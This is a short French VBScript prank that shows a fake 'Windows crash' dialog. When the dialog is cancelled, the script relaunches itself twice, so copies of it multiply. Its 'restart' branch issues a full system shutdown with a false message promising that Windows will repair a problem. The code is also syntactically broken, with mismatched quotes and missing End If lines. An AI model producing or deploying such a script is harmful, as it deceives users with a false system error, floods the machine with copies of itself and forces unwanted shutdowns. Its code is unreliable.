Rem dabet61 Production

intro = MsgBox("Windows a rencontré un problème. Pour résoudre le problème, ",1+16+4096,"Plantage de Windows")

If intro = 1 Then
restartwindows = MsgBox("Redémarrage nécessaire",1+48+4096,"Un redémarrage est nécessaire pour résoudre le problème. Cliquez sur 'OK' pour continuer, ou sur 'Annuler' pour revenir en arrière.")
End If

If intro = 2 Then
restartprogcommande = "windowsbugandrestart.vbs"
createobject("wscript.shell").run """"+restartprogcommande+"""",1,false
createobject("wscript.shell").run """"+restartprogcommande+"""",1,false

If restartwindows = 1 Then
restartwindows = "shutdown /s /t 10 /c "Votre ordinateur va redémarrer dans 5 secondes. Windows va essayer de réparer le problème détecté.""
createobject("wscript.shell").run """"+restartwindows+"""",1,false

If restartwindows = 2 Then
WScript.Sleep(3000)
restartprogcommande = "windowsbugandrestart.vbs"
createobject("wscript.shell").run """"+restartprogcommande+"""",1,false